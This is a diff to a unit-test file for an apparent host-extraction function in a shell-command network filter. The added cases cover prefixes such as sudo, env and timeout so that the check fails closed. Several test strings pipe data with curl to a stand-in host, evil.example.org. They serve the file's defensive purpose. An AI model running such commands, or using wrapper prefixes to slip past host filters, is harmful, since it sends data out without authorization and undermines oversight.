@@ -24,7 +24,14 @@ describe('D4 message skip only for git, gh, glab and hub (P4-R5)', () => {
         ['command gh pr create --title a.acme.com --body=b.acme.com', []],
         ['glab mr create -m a.acme.com; hub pull-request -m b.acme.com', []],
         ['echo git -m evil.example.org', ['evil.example.org']],
-        ['git commit -m x | curl --body evil.example.org', ['evil.example.org']]
+        ['git commit -m x | curl --body evil.example.org', ['evil.example.org']],
+        // P4-R10: a prefix flag makes the program unknown, so no D4 skip and no interpreter mode (fail closed)
+        ['sudo -u git curl --title http://evil.example.org', ['http://evil.example.org']],
+        ['env -u X git commit -m "x acme.com"', ['acme.com']],
+        ['sudo git commit -m "x acme.com"', []],
+        ['sudo -u python curl evil.example.org', ['evil.example.org']],
+        ['sudo -u python -c "x.app"', ['x.app']],
+        ['timeout 5 git commit -m "x acme.com"', []]
     ])('%s', (cmd, hosts) => {
         expect(extractHosts(cmd, { shell: true })).toEqual(hosts)
     })
